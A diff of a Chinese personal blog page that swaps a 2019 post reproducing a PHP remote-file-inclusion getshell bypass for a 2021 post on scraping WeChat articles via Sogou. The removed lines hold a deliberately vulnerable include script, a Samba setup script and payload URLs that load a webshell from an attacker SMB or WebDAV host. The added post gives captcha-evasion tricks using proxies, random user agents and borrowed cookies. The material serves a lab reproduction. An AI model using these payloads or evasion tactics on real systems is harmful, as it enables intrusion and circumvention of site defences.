@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>RFI绕过限制getshell复现 | 九世的博客</title>
-  <meta name="keywords" content=" Writing ">
-  <meta name="description" content="RFI绕过限制getshell复现 | 九世的博客">
+  <title>爬取微信公众号小结 | 九世的博客</title>
+  <meta name="keywords" content=" 爬虫 ">
+  <meta name="description" content="爬取微信公众号小结 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1698,9 +1698,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-RFI绕过限制getshell复现" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-爬取微信公众号小结" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">RFI绕过限制getshell复现</h1>
+        <h1 class="article-title">爬取微信公众号小结</h1>
     
     <div class="article-meta">
         
@@ -1709,14 +1709,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">Writing</a>
+            <a href="javascript:" class="color3">爬虫</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2019-05-31 20:49:05">2019-05-31 18:07</time>
+        创建时间:<time class="date" title="更新时间: 2021-04-11 13:23:36">2021-04-11 12:36</time>
         
     </div>
     <div class="article-meta">
@@ -1738,7 +1738,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#操作的来源"><span class="toc-text">操作的来源</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#复现操作"><span class="toc-text">复现操作</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件包含漏洞总结"><span class="toc-text">文件包含漏洞总结</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爬取的方法"><span class="toc-text">爬取的方法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爬取实现"><span class="toc-text">爬取实现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#爬虫小技巧"><span class="toc-text">爬虫小技巧</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1753,74 +1753,58 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <h2 id="操作的来源"><a href="#操作的来源" class="headerlink" title="操作的来源"></a>操作的来源</h2><p>在搜东西的时候翻到某篇文章，“RFI绕过限制getshell”。看到了一波奇淫技巧，就复现了一波<br>原文链接：<a href="http://www.freebuf.com/news/203442.html" target="_blank" rel="noopener">RFI绕过URL包含限制getshell</a></p>
-<p><img src="https://s2.ax1x.com/2019/05/31/VlWk1f.png" alt=""></p>
-<p>由于原文有限制，限制如下：</p>
-<pre><code>smb只适用于内网
-windows特性才能直接访问smb
-</code></pre><p>之后我在群里看见某位老哥发了张图：<br>（使用Apache搭建webav也行）<br><img src="https://s2.ax1x.com/2019/05/31/VlWRUA.jpg" alt=""></p>
-<h2 id="复现操作"><a href="#复现操作" class="headerlink" title="复现操作"></a>复现操作</h2><p><b>smb绕过</b><br>环境：</p>
-<pre><code>windows：phpstudy
-Linux：samba,apache
-</code></pre><p>在www目录下创建一个php(废话)</p>
-<pre><code class="php">&lt;?php
-if($_GET[&#39;file&#39;]){
-    $f=$_GET[&#39;file&#39;];
-    include &quot;$f&quot;;
-}
-?&gt;
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>一直想爬微信公众号然后整成一个bot。试过好几次<br>最终都以失败告终。昨天折腾了一晚上，利用搜狗的微信爬取弄好了</p>
+<h2 id="爬取的方法"><a href="#爬取的方法" class="headerlink" title="爬取的方法"></a>爬取的方法</h2><p>网上能搜到的爬取方法：</p>
+<ul>
+<li>微信公众号平台接口抓取|限制:微信KEY有限制，30-40分钟内就会过期。请求次数超过10-20次被封</li>
+<li>搜狗公众号爬取 | 缺陷：只能获取公众号最新更新的一条文章</li>
+</ul>
+<h2 id="爬取实现"><a href="#爬取实现" class="headerlink" title="爬取实现"></a>爬取实现</h2><p>这里是用第二种方法，方法如下<br>搜狗微信公众号搜索对应公众号:<code>https://weixin.sogou.com/weixin?type=1&amp;query=bibacps&amp;ie=utf8</code><br>获取文章链接<br><img src="https://z3.ax1x.com/2021/04/11/cwUusx.png" alt=""></p>
+<p>然后请求这个链接得到wx文章的链接<br><img src="https://z3.ax1x.com/2021/04/11/cwU2yq.png" alt=""></p>
+<p>经过测试，发现并无cookie等效验。访问<code>https://weixin.sogou.com/&lt;sougou_wx_lnk&gt;</code>就可以获取wx文章url。但是，请求次数太多就会出现验证码，只有cookie对了才不会有验证码<br>google后得到解决方法：</p>
+<ul>
+<li>随机UA头</li>
+<li>每次请求之前先获取搜狗子域名cookie</li>
+</ul>
+<p>参考链接:<a href="https://blog.csdn.net/weixin_43881394/article/details/107768458" target="_blank" rel="noopener">https://blog.csdn.net/weixin_43881394/article/details/107768458</a></p>
+<p>获取子域名cookie</p>
+<pre><code class="python">import requests
+def getcookie():
+    #从搜狗视频获取cookie，防止傻逼搜狗机制检测
+    url = &#39;https://v.sogou.com/v?ie=utf8&amp;query=&amp;p=40030600&#39;
+    headers = {&#39;User-Agent&#39;: UserAgent().random}
+    rst = requests.get(url=url,headers=headers,allow_redirects=False)
+    cookies = rst.cookies.get_dict()
+    return cookies
 </code></pre>
-<p>将allow_url_fopen和allow_url_include改为Off，只改allow_url_include为Off也行。因为php.ini默认是这样的<br><img src="https://s2.ax1x.com/2019/05/31/VlWx2V.png" alt=""></p>
-<p>将以下代码保存为sh文件在kali上运行：</p>
-<pre><code class="shell">#/usr/bin/bash
+<p>爬取到wx文章链接后入库</p>
+<p>最终效果如下<br><img src="https://z3.ax1x.com/2021/04/11/cw0RCF.png" alt=""></p>
+<p>Github:<a href="https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E7%88%AC%E5%8F%96" target="_blank" rel="noopener">https://github.com/422926799/note/tree/master/%E8%87%AA%E5%B7%B1%E5%86%99%E7%9A%84%E5%B7%A5%E5%85%B7/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7%E7%88%AC%E5%8F%96</a></p>
+<h2 id="爬虫小技巧"><a href="#爬虫小技巧" class="headerlink" title="爬虫小技巧"></a>爬虫小技巧</h2><pre><code>爬取大型站点（例如:google.com）
+可能会遇到的问题：
+    * 请求次数过多导致验证码
+    * Cookie判断是否多次请求
 
-echo &quot;[*] install samba...&quot;
-apt-get install -y samba
+解决发方法
+    * 随机IP代理
+    * 随机UA头
+    * SESSION请求
+    * 针对Cookie判断是否多次请求 （这种大型站点cookie生成机制都是一致的，可以请求这种站点的子域名获取cookie。每次请求之前，先从子域名获取cookie然后在用这个cookie请求要爬取的站点）
+    * 延时请求
 
-echo &quot;[*] setssing smb and setssing smb.conf...&quot;
-mkdir /var/www/html/pub
-chmod 0555 /var/www/html/pub
-chown -R nobody:nogroup /var/www/html/pub
-wget http://192.168.3.92/rfi/smb.conf
-mv smb.conf /etc/samba/
 
-echo &quot;[*] setssing smb.conf success...&quot;
-echo &quot;[*] start samba&quot;
-service smbd start
+遇见CSRF TOKEN效验
+    * TOKEN效验
+    * COOKIE效验
+
+解决方法：
+    * 这种CRSF TOKEN一般在当前页面存在TOKEN，先获取TOKEN在去请求
+
+
+指定某个地区的IP请求
+解决方法：
+    * 使用对应地区的IP请求
 </code></pre>
-<p>smb.conf配置文件：</p>
-<pre><code class="shell">[global]
-workgroup=WORKGROUP
-server string=Samba Server
-netbios name=indishell-lab
-security=user
-map to guest=bad user
-name resolve order=bcast host
-dns proxy = no
-bind interfaces only=yes
-
-[ethan]
-path=/var/www/html/pub
-writable=no
-guest ok=yes
-guest only=yes
-read only=yes
-directory mode=0555
-force user=nobody
-</code></pre>
-<p>安装完成后，在windows上输入\&lt;Attack_IP&gt;<br><img src="https://s2.ax1x.com/2019/05/31/VlhDmD.png" alt=""></p>
-<p>在ethan文件夹上放入小马<br><img src="https://s2.ax1x.com/2019/05/31/Vlho7Q.md.png" alt=""></p>
-<p>执行以下payload：</p>
-<pre><code>http://127.0.0.1/rfi/rfi.php?file=\\192.168.241.132\ethan\demo.php
-</code></pre><p><img src="https://s2.ax1x.com/2019/05/31/VlhxnU.png" alt=""></p>
-<p>由于smb，smb里的php不能接受传参。所以只能放大马</p>
-<p><b>apache搭建webav绕过</b><br>前面说到smb绕过有限制，必须在目标机的同个网段或内网里面，目标机必须是windows<br>在Ubuntu下搭建webdav教程：<a href="https://helpcenter.onlyoffice.com/server/community/connect-webdav-server-ubuntu.aspx" target="_blank" rel="noopener">How to create a WebDAV server on Ubuntu and connect it to ONLYOFFICE - ONLYOFFICE</a></p>
-<p>搭建好之后在Linux的文件管理器中输入dav://127.0.0.1/webdav可以看见如下图就代表成功了<br><img src="https://s2.ax1x.com/2019/05/31/Vlqpfe.md.png" alt=""></p>
-<p>执行以下payload：</p>
-<pre><code>http://127.0.0.1/rfi/rfi.php?file=//192.168.241.132//webdav/demo.php
-</code></pre><p><img src="https://s2.ax1x.com/2019/05/31/VlqAmt.md.png" alt=""></p>
-<h2 id="文件包含漏洞总结"><a href="#文件包含漏洞总结" class="headerlink" title="文件包含漏洞总结"></a>文件包含漏洞总结</h2><p>如图：<br><img src="https://s2.ax1x.com/2019/05/31/VlLxRe.md.png" alt=""></p>
-
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
     </div>
@@ -1829,12 +1813,12 @@ force user=nobody
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>RFI绕过限制getshell复现</p>
+    <p><span class="copy-title">文章标题:</span>爬取微信公众号小结</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2019-05-31, 18:07:22</p>
-    <p><span class="copy-title">最后更新:</span>2019-05-31, 20:49:05</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/9b6dafa5.html" title="RFI绕过限制getshell复现">http://422926799.github.io/posts/9b6dafa5.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-04-11, 12:36:54</p>
+    <p><span class="copy-title">最后更新:</span>2021-04-11, 13:23:36</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/3dedb035.html" title="爬取微信公众号小结">http://422926799.github.io/posts/3dedb035.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
